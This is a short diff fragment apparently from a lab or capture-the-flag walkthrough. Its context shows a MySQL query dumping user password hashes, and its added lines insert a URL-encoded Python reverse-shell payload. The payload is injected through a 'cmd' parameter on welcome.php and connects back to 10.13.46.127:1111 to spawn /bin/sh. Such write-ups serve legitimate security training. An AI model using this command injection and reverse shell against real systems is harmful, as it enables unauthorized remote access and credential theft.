@@ -159,3 +159,7 @@ MySQL [mysql]> SELECT user, CONCAT('$mysql', SUBSTR(authentication_string,1,3), 
 +------------------+-----------------------------------------------------------------------------------------------------------------------------------------------+
 
 ```
+
+```
+http://10.10.148.34/welcome.php?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.13.46.127%22,1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
+```
